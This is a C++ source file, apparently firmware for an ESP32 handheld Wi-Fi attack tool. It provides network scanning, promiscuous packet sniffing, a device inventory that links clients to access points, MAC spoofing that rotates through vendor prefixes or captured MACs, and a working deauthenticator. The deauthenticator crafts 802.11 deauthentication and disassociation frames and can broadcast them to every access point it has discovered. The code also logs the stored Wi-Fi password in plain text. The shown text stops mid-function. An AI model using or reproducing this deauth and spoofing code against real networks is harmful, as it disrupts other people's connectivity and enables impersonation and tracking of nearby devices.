#include "wifi_menu.hpp"

//statics
static wifi_config_t cached_connection_config = {};
static std::atomic<bool> has_cached_connection{false};
static std::atomic<bool> manual_disconnect{false};
static std::atomic<ScanContext> current_scan_context{ScanContext::CONNECT_TO_A_NETWORK};
static std::atomic<bool> deauth_running{false};
static bool updating_mac = false;

static uint8_t target_bssid[6] = {};
static const uint8_t empty_bssid[6] = {};
static uint8_t current_network_bssid[6] = {};
static std::atomic<uint32_t> current_second_packet_count{};

static InventoryDevice inventory_list[MAX_INVENTORY_DEVICES] = {};
static std::atomic<uint16_t> inventory_count{};
static std::atomic<bool> inventory_needs_ui_update{false};
static char last_roller_content[MAX_INVENTORY_DEVICES * (MANUFACTURER_STR_LEN + 1)] = {};
static bool display_manufacturers_mode = false;
static size_t oui_database_count = 0;

static uint8_t deauthenticate_mac[6] = {};
static char* vendor_roller_str = nullptr;

static lv_chart_series_t* packet_series = nullptr;
static lv_timer_t* chart_timer = nullptr;
static lv_timer_t* inventory_ui_timer = nullptr;
static lv_timer_t* radar_ui_timer = nullptr;
static lv_timer_t* mac_rotation_timer = nullptr;
static lv_timer_t* deauth_timer = nullptr;

static const OUIEntry manufacturer_ouis[] = {
    {0x00037F, "Atheros (Qualcomm)"},
    {0x0007AB, "Samsung Electronics"},
    {0x000C29, "VMware (Virtual Machine)"},
    {0x000E7F, "Sonos, Inc."},
    {0x000F66, "Cisco-Linksys"},
    {0x0010FA, "Cisco Systems"},
    {0x001132, "Synology Inc."},
    {0x001377, "HP Inc. (Printers)"},
    {0x001422, "Dell Inc."},
    {0x0014D1, "TP-Link Technologies"},
    {0x00163E, "Xen Project (Oracle)"},
    {0x0017F2, "Apple Inc."},
    {0x001A11, "Google Inc."},
    {0x001C42, "Parallels (Virtual Machine)"},
    {0x002275, "Hewlett-Packard (HP)"},
    {0x0024A4, "ASUSTeK Computer"}, 
    {0x00268B, "Realtek Semiconductor"},
    {0x005056, "VMware ESXi"},
    {0x00E04C, "Realtek Semiconductor"},
    {0x00E04F, "Ubiquiti Networks"},
    {0x0242AC, "Docker Container Bridge"},
    {0x040CCE, "Apple Inc."},
    {0x0456E5, "Samsung Electronics"},
    {0x080027, "PCSystem (VirtualBox)"},
    {0x18F643, "Apple Inc."},
    {0x18FE34, "Espressif Systems"},
    {0x1C5A6B, "Philips Lighting"},
    {0x20330E, "Microslop Corporation"},
    {0x246F28, "Espressif Systems"},
    {0x286FB9, "Nokia"},
    {0x2C26C5, "Lenovo"},
    {0x2C56DC, "Xiaomi Communications"},
    {0x30B5C2, "Netgear"},
    {0x3CA82A, "Raspberry Pi Trading"},
    {0x40ED30, "Amazon Technologies"}, 
    {0x488A15, "Intel Corporate"},
    {0x48D6D5, "Sony Interactive Ent."},
    {0x4C1744, "Amazon Technologies"},
    {0x525400, "QEMU / KVM"},
    {0x64644A, "Xiaomi Mobile"},
    {0x70A115, "Roku, Inc."},
    {0x70B5E8, "Wyze Labs"},
    {0xAC67B2, "MediaTek Inc."},
    {0xB4FBB8, "Amazon Technologies"},
    {0xCC46D6, "Cisco Systems"},
    {0xDC4A3E, "Nintendo Co., Ltd."},
    {0xEC1A59, "D-Link"},
    {0xFCFBFB, "Cisco Systems"}
};


//helpers
void init_packet_chart() {
    lv_chart_set_range(objects.packet_logging_chart, LV_CHART_AXIS_PRIMARY_Y, 0, 1000);
    lv_chart_set_axis_tick(objects.packet_logging_chart, LV_CHART_AXIS_PRIMARY_Y, 10, 5, 5, 1, true, 40);
    lv_chart_set_point_count(objects.packet_logging_chart, 60);
    lv_chart_set_update_mode(objects.packet_logging_chart, LV_CHART_UPDATE_MODE_SHIFT);

    if (packet_series == nullptr) {
        packet_series = lv_chart_add_series(objects.packet_logging_chart, lv_palette_main(LV_PALETTE_GREEN), LV_CHART_AXIS_PRIMARY_Y);
    }
}
void init_psram_oui_database() {
    oui_database_count = sizeof(manufacturer_ouis) / sizeof(manufacturer_ouis[0]);


    size_t total_string_bytes = 0;
    for (size_t i = 0; i < oui_database_count; i++) {
        total_string_bytes += strlen(manufacturer_ouis[i].manufacturer);
        total_string_bytes += 1;
    }

    vendor_roller_str = static_cast<char*>(heap_caps_malloc(total_string_bytes, MALLOC_CAP_SPIRAM));

    if (vendor_roller_str == nullptr) {
        printf("CRITICAL ERROR: Failed to allocate PSRAM for Spoofer Roller String!\n");
        return;
    }

    char* write_ptr = vendor_roller_str;
    for (size_t i = 0; i < oui_database_count; i++) {
        size_t len = strlen(manufacturer_ouis[i].manufacturer);
        memcpy(write_ptr, manufacturer_ouis[i].manufacturer, len);
        write_ptr += len;

        if (i < oui_database_count - 1) {
            *write_ptr = '\n';
            write_ptr++;
        }
    }
    *write_ptr = '\0';

    printf("Roller String (%d bytes) Loaded into PSRAM from Flash.\n", total_string_bytes);
    heap_caps_print_heap_info(MALLOC_CAP_SPIRAM);
}
void chart_update_timer_cb(lv_timer_t * timer) {
    uint32_t count = current_second_packet_count.exchange(0, std::memory_order_relaxed);

    if (count > 1000) count = 1000;

    if (packet_series != nullptr && objects.packet_logging_chart != nullptr) {
        lv_chart_set_next_value(objects.packet_logging_chart, packet_series, count);
        lv_chart_refresh(objects.packet_logging_chart);
    }
}
void packet_sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
    wifi_promiscuous_pkt_t *pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
    uint8_t *frame = pkt->payload;

    if (memcmp(target_bssid, empty_bssid, 6) == 0) {
        current_second_packet_count.fetch_add(1, std::memory_order_relaxed);

        //save frame to csv in littlefs
    }
    else if (memcmp(&frame[4], target_bssid, 6) == 0 || memcmp(&frame[10], target_bssid, 6) == 0 || memcmp(&frame[16], target_bssid, 6) == 0) {
        current_second_packet_count.fetch_add(1, std::memory_order_relaxed);

        //save frame to csv in littlefs
    }
}
void wifi_scan_done_handler(void* arg, esp_event_base_t event_base, int32_t event_id, void* event_data) {
    uint16_t ap_count = 0;
    esp_wifi_scan_get_ap_num(&ap_count);

    if (current_scan_context.load(std::memory_order_acquire) == ScanContext::CONNECT_TO_A_NETWORK) {
        printf("Scan complete! Found %d networks\n", ap_count);

        if (ap_count > 0) {
            std::string roller_options = "";
            wifi_ap_record_t *ap_info = new wifi_ap_record_t[ap_count];
            
            if (esp_wifi_scan_get_ap_records(&ap_count, ap_info) == ESP_OK) {
                lvgl_port_lock(0);

                total_scanned_networks = ap_count;

                for (size_t i = 0; i < ap_count && i < MAX_SCAN_NETWORKS; i++) {
                    if (i < MAX_SCAN_NETWORKS) { 
                        scanned_protocols[i] = ap_info[i].authmode; 
                    }

                    roller_options.append(reinterpret_cast<char*>(ap_info[i].ssid));
                    if (i < ap_count - 1) {
                        roller_options.append("\n");
                    }
                }
                
                lv_roller_set_options(objects.discovered_ssids, roller_options.c_str(), LV_ROLLER_MODE_NORMAL);
                lvgl_port_unlock();
            }
            delete[] ap_info;
        }
    }
    else if (current_scan_context.load(std::memory_order_acquire) == ScanContext::FIND_LOGGER_TARGET) {
        if (ap_count > 0) {
            wifi_ap_record_t target_ap;

            if (esp_wifi_scan_get_ap_records(&ap_count, &target_ap) == ESP_OK) {
                uint8_t target_channel = target_ap.primary;
                memcpy(target_bssid, target_ap.bssid, 6);

                if (get_var_wifi_active()) {
                    manual_disconnect.store(true, std::memory_order_release);
                    esp_wifi_disconnect();
                    set_var_wifi_active(false);
                    
                    lvgl_port_lock(0);
                    lv_obj_set_style_bg_color(objects.enable_wifi_button, lv_color_hex(0x747474), LV_PART_MAIN);
                    lvgl_port_unlock();
                }

                wifi_promiscuous_filter_t filter;
                filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA; 
                esp_wifi_set_promiscuous_filter(&filter);
                esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
                esp_wifi_set_promiscuous_rx_cb(&packet_sniffer_cb);

                lvgl_port_lock(0);
                chart_timer = lv_timer_create(chart_update_timer_cb, 1000, NULL);
                lvgl_port_unlock();

                esp_wifi_set_promiscuous(true);
            }
        }
        else {
            lvgl_port_lock(0);
            lv_obj_clear_state(objects.toggle_packet_logging_switch, LV_STATE_CHECKED);
            lvgl_port_unlock();
        }
    }
}
void wifi_connection_handler(void* arg, esp_event_base_t event_base, int32_t event_id, void* event_data) {
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        lvgl_port_lock(0);
        if (!manual_disconnect.load(std::memory_order_acquire)) {
            has_cached_connection = false;
            printf("Wifi Connection Failed!\n");
            lv_obj_set_style_bg_color(objects.enable_wifi_button, lv_palette_main(LV_PALETTE_RED), LV_PART_MAIN);
            manual_disconnect.store(false, std::memory_order_release);
        }
        else {
            lv_obj_set_style_bg_color(objects.enable_wifi_button, lv_color_hex(0x747474), LV_PART_MAIN);
        }
        set_var_wifi_active(false);
        lvgl_port_unlock();
    }
    
    else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t* event = reinterpret_cast<ip_event_got_ip_t*>(event_data);
        printf("Wifi Connected. IP Address: " IPSTR "\n", IP2STR(&event->ip_info.ip));
        
        lvgl_port_lock(0);
        set_var_wifi_active(true);
        lv_obj_set_style_bg_color(objects.enable_wifi_button, lv_palette_main(LV_PALETTE_GREEN), LV_PART_MAIN);
        lvgl_port_unlock();
    }
}
const char* resolve_manufacturer_from_mac(uint8_t* mac) {
    if ((mac[0] & 0x02) == 0x02) {
        return "Randomized (Unknown)";
    }

    uint32_t target_oui = (mac[0] << 16) | (mac[1] << 8) | mac[2];

    int left = 0;
    int right = oui_database_count - 1;

    while (left <= right) {
        int mid = left + (right - left) / 2;

        if (manufacturer_ouis[mid].oui_prefix == target_oui) {
            return manufacturer_ouis[mid].manufacturer;
        }

        if (manufacturer_ouis[mid].oui_prefix < target_oui) {
            left = mid + 1;
        }
        else {
            right = mid - 1;
        }
    }

    return "Unknown device";
}
void update_device(uint8_t* mac, uint8_t channel, int8_t rssi, DeviceType type) {
    uint16_t current_count = inventory_count.load(std::memory_order_acquire); 
    for (size_t i = 0; i < current_count; i++) {
        if (memcmp(inventory_list[i].mac, mac, 6) == 0) {
            inventory_list[i].last_seen_ms = time_ms();
            inventory_list[i].packet_count++;
            inventory_list[i].active = true;
            inventory_list[i].last_rssi = rssi;

            if (channel > 0 && channel <= 11) {
                inventory_list[i].channel = channel;
                inventory_list[i].has_channel = true;
            }

            if (type == DeviceType::ACCESS_POINT && inventory_list[i].device_type == DeviceType::UNKNOWN) {
                inventory_list[i].device_type = DeviceType::ACCESS_POINT;
            }
            return;
        }
    }

    if (current_count < MAX_INVENTORY_DEVICES) {
        uint16_t insert_idx = current_count;
        
        for (uint16_t i = 0; i < current_count; i++) {
            if (memcmp(mac, inventory_list[i].mac, 6) < 0) {
                insert_idx = i;
                break;
            }
        }
        
        if (insert_idx < current_count) {
            memmove(&inventory_list[insert_idx + 1], &inventory_list[insert_idx], (current_count - insert_idx) * sizeof(InventoryDevice));
        }
        
        memcpy(inventory_list[insert_idx].mac, mac, 6);
        inventory_list[insert_idx].last_rssi = 0;
        inventory_list[insert_idx].device_type = type;
        inventory_list[insert_idx].channel = channel;
        inventory_list[insert_idx].last_rssi = rssi;
        inventory_list[insert_idx].has_channel = (channel > 0 && channel <= 11);
        inventory_list[insert_idx].last_seen_ms = time_ms(); 
        inventory_list[insert_idx].packet_count = 1;
        inventory_list[insert_idx].active = true;
        inventory_list[insert_idx].has_ap = false;
        memset(inventory_list[insert_idx].ap_mac, 0, 6);
        
        const char* vendor = resolve_manufacturer_from_mac(mac);
        snprintf(inventory_list[insert_idx].manufacturer, 32, "%s", vendor);
        inventory_list[insert_idx].has_manufacturer = true;
        
        inventory_count.store(current_count + 1, std::memory_order_release);
        inventory_needs_ui_update.store(true, std::memory_order_release);
    }
}
void update_client(uint8_t* client_mac, uint8_t* ap_mac, uint8_t channel, int8_t rssi) {
    update_device(client_mac, channel, rssi, DeviceType::CLIENT);

    uint16_t current_count = inventory_count.load(std::memory_order_acquire);
    for (size_t i = 0; i < current_count; i++) {
        if (memcmp(inventory_list[i].mac, client_mac, 6) == 0) {
            memcpy(inventory_list[i].ap_mac, ap_mac, 6);
            inventory_list[i].has_ap = true;

            if (!inventory_list[i].has_channel) {
                inventory_list[i].channel = channel;
                inventory_list[i].has_channel = true;
            }
            break;
        }
    }

    update_device(ap_mac, channel, rssi, DeviceType::ACCESS_POINT);
}
void device_inventory_sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

    wifi_promiscuous_pkt_t* pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
    uint8_t* frame = pkt->payload;
    uint8_t channel = pkt->rx_ctrl.channel;
    int8_t rssi = pkt->rx_ctrl.rssi;

    uint8_t* mac_dst = &frame[4];   
    uint8_t* mac_src = &frame[10];
    uint8_t* mac_bssid = &frame[16]; 
    uint8_t frame_type = frame[0] & 0x0C;  
    uint8_t frame_subtype = (frame[0] & 0xF0) >> 4;

    if (frame_type == 0 && frame_subtype == 8) {
        update_device(mac_src, channel, rssi, DeviceType::ACCESS_POINT);
    }
    else if (frame_type == 2) {
        if (is_known_ap(mac_bssid, inventory_count.load(std::memory_order_acquire), inventory_list)) {
            uint8_t* client_mac = (memcmp(mac_src, mac_bssid, 6) == 0) ? mac_dst : mac_src;

            if (!is_broadcast_mac(client_mac)) {
                update_client(client_mac, mac_bssid, channel, rssi);
            }
        }

        update_device(mac_bssid, channel, rssi, DeviceType::ACCESS_POINT);
        update_device(mac_src, channel, rssi, DeviceType::UNKNOWN);
        update_device(mac_dst, channel, rssi, DeviceType::UNKNOWN);
    }

    else if (frame_type == 0 && frame_subtype == 4) {
        update_device(mac_src, channel, rssi, DeviceType::CLIENT);
    }

    else if (frame_type == 0 && (frame_subtype == 0 || frame_subtype == 2)) {
        if (frame_subtype == 0) { 
            uint8_t* client_mac = mac_src;
            uint8_t* ap_mac = mac_dst;
            update_client(client_mac, ap_mac, channel, rssi);
        }
    }
}
void inventory_ui_timer_cb(lv_timer_t * timer) {
    if (!inventory_needs_ui_update.load(std::memory_order_acquire)) return;
    if (lv_obj_get_state(objects.inventoried_devices_roller) & LV_STATE_PRESSED) return;

    inventory_needs_ui_update.store(false, std::memory_order_release);
    uint16_t current_count = inventory_count.load(std::memory_order_acquire);

    char old_selected_str[32] = {};
    lv_roller_get_selected_str(objects.inventoried_devices_roller, old_selected_str, sizeof(old_selected_str));

    std::string roller_str = "";
    roller_str.reserve(current_count * 32);
    char mac_str[MAC_STR_LEN];
    char manufacturer_str[MANUFACTURER_STR_LEN];
    uint8_t* current_mac;
    uint16_t new_selected_idx = 0;

    for (size_t i = 0; i < current_count; i++) {
        current_mac = inventory_list[i].mac;
        if (display_manufacturers_mode) {
            const char* vendor_name;
            if (inventory_list[i].has_manufacturer) {
                vendor_name = inventory_list[i].manufacturer;
            }
            else {
                vendor_name = resolve_manufacturer_from_mac(current_mac);
            }
            snprintf(manufacturer_str, sizeof(manufacturer_str), "%s", vendor_name);
            roller_str += manufacturer_str;
            if (strcmp(manufacturer_str, old_selected_str) == 0) {
                new_selected_idx = i; 
            }
        }
        else {
            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X", current_mac[0], current_mac[1], current_mac[2], current_mac[3], current_mac[4], current_mac[5]);
            roller_str += mac_str;
            if (strcmp(mac_str, old_selected_str) == 0) {
                new_selected_idx = i; 
            }
        }
        if (i < current_count - 1) {
            roller_str += "\n";
        }
    }

    if (strncmp(roller_str.c_str(), last_roller_content, sizeof(last_roller_content)) == 0) {
        return;
    }
    strncpy(last_roller_content, roller_str.c_str(), sizeof(last_roller_content) - 1);
    last_roller_content[sizeof(last_roller_content) - 1] = '\0';

    lv_roller_set_options(objects.inventoried_devices_roller, roller_str.c_str(), LV_ROLLER_MODE_NORMAL);
    lv_roller_set_selected(objects.inventoried_devices_roller, new_selected_idx, LV_ANIM_OFF);
}
void radar_ui_timer_cb(lv_timer_t * timer) {
    uint16_t current_count = inventory_count.load(std::memory_order_acquire);
    if (current_count == 0) return;

    uint16_t selected_idx = lv_roller_get_selected(objects.inventoried_devices_roller);

    if (selected_idx < current_count) {
        int16_t raw_rssi = inventory_list[selected_idx].last_rssi;

        raw_rssi = clamp(raw_rssi, RSSI_MIN, RSSI_MAX);

        uint8_t percentage = static_cast<uint8_t>(raw_rssi - (RSSI_MIN)) * 100 / (RSSI_MAX - (RSSI_MIN));

        lv_color_t bar_color;

        if (percentage >= 60) {
            uint8_t mix_ratio = (percentage - 60) * 255 / 40; 
            bar_color = lv_color_mix(lv_palette_main(LV_PALETTE_GREEN), lv_palette_main(LV_PALETTE_YELLOW), mix_ratio);
        } 
        else if (percentage >= 30) {
            uint8_t mix_ratio = (percentage - 30) * 255 / 30; 
            bar_color = lv_color_mix(lv_palette_main(LV_PALETTE_YELLOW), lv_palette_main(LV_PALETTE_RED), mix_ratio);
        } 
        else {
            bar_color = lv_palette_main(LV_PALETTE_RED);
        }

        lv_bar_set_value(objects.rssi_bar, percentage, LV_ANIM_ON);
        lv_obj_set_style_bg_color(objects.rssi_bar, bar_color, LV_PART_INDICATOR);
    }
}
void fill_mac_spoofer_roller(bool use_inventory) {
    if (!use_inventory && vendor_roller_str == nullptr) {
        lv_obj_add_state(objects.toggle_macs_to_spoof_switch, LV_STATE_CHECKED);
        lv_obj_add_state(objects.toggle_macs_to_spoof_switch, LV_STATE_DISABLED);
        use_inventory = true;
    }
    else {
        lv_obj_clear_state(objects.toggle_macs_to_spoof_switch, LV_STATE_DISABLED);
    }

    uint16_t current_count = inventory_count.load(std::memory_order_acquire);

    if (use_inventory) {
        std::string spoofer_str = "";
        spoofer_str.reserve(current_count * 18);
        char mac_str[MAC_STR_LEN] = {};
        uint8_t mac[6];
        for (size_t i = 0; i < current_count; i++) {
            memcpy(mac, inventory_list[i].mac, 6 * sizeof(uint8_t));
            snprintf(mac_str, MAC_STR_LEN, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
            spoofer_str += mac_str;

            if (i < current_count - 1) {
                spoofer_str += '\n';
            }
        }
        lv_roller_set_options(objects.pick_mac_to_spoof_roller, spoofer_str.c_str(), LV_ROLLER_MODE_NORMAL);
    }
    else if (vendor_roller_str != nullptr) {
        lv_roller_set_options(objects.pick_mac_to_spoof_roller, vendor_roller_str, LV_ROLLER_MODE_NORMAL);
    }
}
void init_wifi_menu() {
    lv_obj_add_flag(objects.keyboard_wifi, LV_OBJ_FLAG_HIDDEN);
    fill_mac_spoofer_roller(false);

    uint8_t mac[6];
    char mac_str[MAC_STR_LEN];
    esp_wifi_get_mac(WIFI_IF_STA, mac);
    snprintf(mac_str, MAC_STR_LEN, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    lv_label_set_text(objects.current_mac_label, mac_str);
}
void mac_rotation_timer_cb(lv_timer_t* timer) {
    uint8_t mac[6];

    for (int i = 0; i < 6; i++) {
        mac[i] = esp_random() & 0xFF;
    }

    bool use_inventory = lv_obj_has_state(objects.toggle_macs_to_spoof_switch, LV_STATE_CHECKED);

    if (!use_inventory && oui_database_count > 0) {
        uint16_t selected_idx = lv_roller_get_selected(objects.pick_mac_to_spoof_roller);
        
        if (selected_idx < oui_database_count) {
            uint32_t target_oui = manufacturer_ouis[selected_idx].oui_prefix;
            mac[0] = (target_oui >> 16) & 0xFF;
            mac[1] = (target_oui >> 8) & 0xFF;
            mac[2] = target_oui & 0xFF;
        }
    }

    mac[0] = (mac[0] & 0xFC) | 0x02;

    char mac_str[MAC_STR_LEN];
    snprintf(mac_str, MAC_STR_LEN, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    lv_textarea_set_text(objects.mac_to_spoof_textarea, mac_str);

    bool was_connected = get_var_wifi_active();
    if (was_connected) {
        manual_disconnect.store(true, std::memory_order_release);
        esp_wifi_disconnect();
        set_var_wifi_active(false);
        lv_obj_set_style_bg_color(objects.enable_wifi_button, lv_color_hex(0x747474), LV_PART_MAIN);
    }
    
    esp_wifi_stop();
    esp_err_t err = esp_wifi_set_mac(WIFI_IF_STA, mac);
    esp_wifi_start();

    if (err == ESP_OK) {
        lv_label_set_text(objects.current_mac_label, mac_str);

        if (was_connected && has_cached_connection) {     
            printf("Attempting to restore connection: SSID: %hhn, password: %s\n", cached_connection_config.sta.ssid, cached_connection_config.sta.password);        
            esp_wifi_set_config(WIFI_IF_STA, &cached_connection_config); 
            esp_wifi_connect(); 
        }
        else {
            printf("Either was not connected: %d or did not have a cached connection: %d", was_connected, has_cached_connection.load(std::memory_order_acquire));
        }
    }
    else {
        printf("Failed to reconnect. Error_occured: %s\n", esp_err_to_name(err));
        lv_obj_clear_state(objects.toggle_mac_rotation_switch, LV_STATE_CHECKED);
        if (mac_rotation_timer != nullptr) {
            lv_timer_del(mac_rotation_timer);
            mac_rotation_timer = nullptr;
        }
    }
}
size_t craft_deauth_frame(uint8_t* buf, uint8_t* client_mac, uint8_t* ap_mac, uint8_t type, uint8_t reason) {
    size_t i = 0;
    buf[i++] = type; //0xc0 = deauth, 0xa0 = disassociation
    buf[i++] = 0x00; //flags
    buf[i++] = 0x3A; buf[i++] = 0x01; //duration

    memcpy(&buf[i], client_mac, 6); i += 6; //destination
    memcpy(&buf[i], ap_mac, 6); i += 6; //source
    memcpy(&buf[i], ap_mac, 6); i+= 6; //bssid

    //sequence number
    static uint16_t seq_num = 0;
    uint16_t sc = (seq_num << 4);
    buf[i++] = sc & 0xFF;
    buf[i++] = (sc >> 8) & 0xFF;
    seq_num++;

    buf[i++] = reason; buf[i++] = 0x00; //reason

    return i;
}
void send_deauth_packet(uint8_t* client_mac, uint8_t* ap_mac, uint8_t type, uint8_t reason) {
    uint8_t packet[32];
    size_t len = craft_deauth_frame(packet, client_mac, ap_mac, type, reason);

    esp_wifi_80211_tx(WIFI_IF_STA, packet, len, false);
}
void deauth_sweep(uint8_t* client_mac, uint8_t* ap_mac) {
    uint8_t reasons[] = {1, 4, 6, 7};
    uint8_t types[] = {0xC0, 0xA0};

    for (uint8_t t : types) {
        for (uint8_t r : reasons) {
            send_deauth_packet(client_mac, ap_mac, t, r);
            delay_us(100);
        }
    }
}
void broadcast_deauth(uint8_t* ap_mac) {
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    deauth_sweep(broadcast_mac, ap_mac);
}
bool get_client_ap(uint8_t* client_mac, uint8_t* out_ap_mac, uint8_t* out_channel) {
    uint16_t current_count = inventory_count.load(std::memory_order_acquire);
    for (size_t i = 0; i < current_count; i++) {
        if (memcmp(inventory_list[i].mac, client_mac, 6) == 0) {
            if (inventory_list[i].has_ap) {
                memcpy(out_ap_mac, inventory_list[i].ap_mac, 6);
                *out_channel = inventory_list[i].channel;
                return true;
            }
        }
    }
    return false;
}
void deauthenticator_timer_cb(lv_timer_t * timer) {
    if (!deauth_running.load(std::memory_order_acquire)) return;

    bool kick_all = lv_obj_has_state(objects.deauth_all_checkbox, LV_STATE_CHECKED);
    const char* mac_str = lv_textarea_get_text(objects.deauthenticate_mac_textarea);

    if (kick_all) {
        uint8_t unique_aps[32][6];
        size_t ap_count = 0;
        uint16_t current_count = inventory_count.load(std::memory_order_acquire);

        for (size_t i = 0; i < current_count; i++) {
            if (inventory_list[i].device_type == DeviceType::ACCESS_POINT || inventory_list[i].has_ap) {
                bool found = false;

                for (size_t j = 0; j < ap_count; j++) {
                    if (memcmp(unique_aps[j], inventory_list[i].ap_mac, 6) == 0) {
                        found = true;
                        break;
                    }
                }
                if (!found && inventory_list[i].has_ap) {
                    memcpy(unique_aps[ap_count], inventory_list[i].ap_mac, 6);
                    ap_count++;
                }
            } 
        }

        for (uint8_t i = 0; i < ap_count; i++) {
            uint8_t channel = 1;
            for (uint16_t j = 0; j < current_count; j++) {
                if (memcmp(inventory_list[j].mac, unique_aps[i], 6) == 0) {
                    channel = inventory_list[j].channel;
                    break;
                }
            }
            esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
            delay_ms(1);
            
            broadcast_deauth(unique_aps[i]);
        }
    }
    else {
        uint8_t target_mac[6];
        if (sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &target_mac[0], &target_mac[1], &target_mac[2], &target_mac[3], &target_mac[4], &target_mac[5]) == 6) {
            
            uint8_t ap_mac[6];
            uint8_t channel;
            if (get_client_ap(target_mac, ap_mac, &channel)) {
                esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
                delay_ms(1);
                
                deauth_sweep(target_mac, ap_mac);
            } else {
                for (uint8_t ch = 1; ch <= 11; ch++) {
                    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                    delay_ms(1);

                    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                    deauth_sweep(target_mac, broadcast_mac);
                }
            }
        }
    }
}


//variables
int32_t get_var_wifi_option() { return wifi_option; }
void set_var_wifi_option(int32_t value) { wifi_option = value; }
int32_t get_var_network_found_ssid() { return network_found_ssid; }
void set_var_network_found_ssid(int32_t value) { network_found_ssid = value; }
int32_t get_var_device_inventory_signal_strength() { return device_inventory_signal_strength; };
void set_var_device_inventory_signal_strength(int32_t value) { device_inventory_signal_strength = (value < RSSI_MIN ? RSSI_MIN : value > RSSI_MAX ? RSSI_MAX : value); }


//actions
void action_change_wifi_option(lv_event_t * e) {
    lv_obj_t* wifi_options[] = {
        objects.connect_to_anetwork_container,
        objects.packet_logging_container,
        objects.device_inventory_container,
        objects.mac_spoofer_container,
        objects.deauthenticator_container
    };
    size_t num_wifi_options = sizeof(wifi_options) / sizeof(lv_obj_t*);

    uint16_t option = lv_dropdown_get_selected(objects.wifi_option_dropdown);

    for (size_t i = 0; i < num_wifi_options; i++) {
        if (i == option) {
            lv_obj_clear_flag(wifi_options[i], LV_OBJ_FLAG_HIDDEN);
        }
        else {
            lv_obj_add_flag(wifi_options[i], LV_OBJ_FLAG_HIDDEN);
        }
    }
}
void action_scan_networks(lv_event_t * e) {
    set_var_show_keyboard(false);
    lv_obj_add_flag(objects.keyboard_wifi, LV_OBJ_FLAG_HIDDEN);

    printf("Starting non-blocking network scan...\n");

    wifi_scan_config_t scan_cfg = {};
    scan_cfg.show_hidden = false;

    current_scan_context.store(ScanContext::CONNECT_TO_A_NETWORK, std::memory_order_release);
    esp_err_t err = esp_wifi_scan_start(&scan_cfg, false);
    
    if (err != ESP_OK) {
        printf("Failed to start scan: %d\n", err);
    }
}
void action_toggle_wifi(lv_event_t * e) {
    if (get_var_wifi_active()) {
        wifi_ap_record_t current_ap;

        esp_err_t status = esp_wifi_sta_get_ap_info(&current_ap);

        if (status == ESP_OK) {
            manual_disconnect.store(true, std::memory_order_release);
            esp_wifi_disconnect();
            set_var_wifi_active(false);
            lv_obj_set_style_bg_color(objects.enable_wifi_button, lv_color_hex(0x747474), LV_PART_MAIN);
        }
        else {
            printf("Error disconnecting wifi\n");
            lv_obj_set_style_bg_color(objects.enable_wifi_button, lv_palette_main(LV_PALETTE_RED), LV_PART_MAIN);
        }
    }
    else {
        const char* ssid = lv_textarea_get_text(objects.wifissid_text_area);
        const char* password = lv_textarea_get_text(objects.wifi_password_text_area);
        uint16_t protocol_index = lv_dropdown_get_selected(objects.wifi_protocol_dropdown);

        wifi_config_t wifi_cfg = {};
        strlcpy(reinterpret_cast<char*>(wifi_cfg.sta.ssid), ssid, sizeof(wifi_cfg.sta.ssid));
        strlcpy(reinterpret_cast<char*>(wifi_cfg.sta.password), password, sizeof(wifi_cfg.sta.password));

        switch (protocol_index) {
            case 0:
                wifi_cfg.sta.threshold.authmode = WIFI_AUTH_OPEN;
                break;
            case 1:
                wifi_cfg.sta.threshold.authmode = WIFI_AUTH_WPA2_PSK;
                break;
            case 2: 
                wifi_cfg.sta.threshold.authmode = WIFI_AUTH_WPA3_PSK; 
                break;
            case 3: 
                wifi_cfg.sta.threshold.authmode = WIFI_AUTH_WPA2_ENTERPRISE; 
                break;
            case 4: 
                wifi_cfg.sta.threshold.authmode = WIFI_AUTH_WEP; 
                break;
            default: 
                wifi_cfg.sta.threshold.authmode = WIFI_AUTH_WPA2_PSK; 
                break;
        }

        cached_connection_config = wifi_cfg;
        has_cached_connection = true;

        esp_wifi_set_config(WIFI_IF_STA, &wifi_cfg);
        esp_wifi_connect();

        lv_obj_set_style_bg_color(objects.enable_wifi_button, lv_palette_main(LV_PALETTE_YELLOW), LV_PART_MAIN);
    }
}
void action_select_ssid(lv_event_t * e) {
    char current_selected_ssid[MAX_SSID_LEN + 1] = {};
    lv_roller_get_selected_str(objects.discovered_ssids, current_selected_ssid, MAX_SSID_LEN + 1);
    lv_textarea_set_text(objects.wifissid_text_area, current_selected_ssid);

    uint16_t selected_index = lv_roller_get_selected(objects.discovered_ssids);

    if (selected_index >= total_scanned_networks || selected_index >= MAX_SCAN_NETWORKS) return;

    wifi_auth_mode_t hw_protocol = scanned_protocols[selected_index];

    uint16_t dropdown_index = 0;

    switch (hw_protocol) {
            case WIFI_AUTH_OPEN: 
                dropdown_index = 0; 
                break;
            case WIFI_AUTH_WPA_PSK: 
                dropdown_index = 1; 
                break;
            case WIFI_AUTH_WPA2_PSK: 
                dropdown_index = 1; 
                break;
            case WIFI_AUTH_WPA_WPA2_PSK: 
                dropdown_index = 1; 
                break;
